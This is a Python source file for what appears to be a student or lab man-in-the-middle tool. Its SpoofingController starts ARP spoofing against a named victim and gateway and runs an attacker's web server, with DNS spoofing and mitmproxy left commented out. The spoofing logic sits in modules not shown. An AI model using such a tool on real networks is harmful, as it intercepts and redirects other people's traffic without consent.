import threading
from arp_spoof import ARPSpoofer
from dns_spoof import DNSSpoofer
from web_server import WEBServer
from mitmproxy.tools.main import mitmdump
from interface import App

import sys

class SpoofingController:
    def __init__(self, victim:dict, gtw:dict, attacker:dict):
        self.arp_spoofer = ARPSpoofer(victim_ip=victim.get('ip'), router_ip=gtw.get('ip'), attacker_mac=attacker.get("mac"), victim_mac=victim.get('mac'), router_mac=gtw.get('mac'))
        # self.dns_spoofer = DNSSpoofer(attacker_ip, victim_ip, domain)
        self.web_server = WEBServer(attacker.get("ip"))

    def start_attack(self):
        print("Starting ARP spoofing, DNS spoofing, and Web server...")
       

        # Create threads for each task
        arp_thread = threading.Thread(target=self.arp_spoofer.spoof)
        # dns_thread = threading.Thread(target=self.dns_spoofer.spoof)
        web_thread = threading.Thread(target=self.web_server.listen)
        # mitmproxy_thread = threading.Thread(target=start_mitmproxy)

        # Start all threads
        arp_thread.start()
        # mitmproxy_thread.start()
        # dns_thread.start()
        web_thread.start()

        # Wait for all threads to finish
        arp_thread.join()
        # mitmproxy_thread.join()
        # dns_thread.join()
        web_thread.join()

    def stop_attack(self):
        print("Stopping all spoofing and web server...")


if __name__ == "__main__":
    # victim = {
    #     'ip' : '192.168.1.74',
    #     'mac' : "8:0:27:b4:97:59"
    # }
    # gtw = {
    #     'ip' : '192.168.1.254',
    #     'mac' : "80:ca:4b:ac:f3:3"
    # }
    # attacker = {
    #     'ip' : '192.168.1.72',
    #     'mac' : "ac:bc:32:91:0a:ad"
    # }

    # controller = SpoofingController(victim=victim, gtw=gtw, attacker=attacker)

    # # Define a function to run `mitmdump` with your custom script
    
    

    # try:
    #     controller.start_attack()
    # except KeyboardInterrupt:
    #     controller.stop_attack()
    #     print("\nAttack stopped.")
    app = App()
    app.mainloop()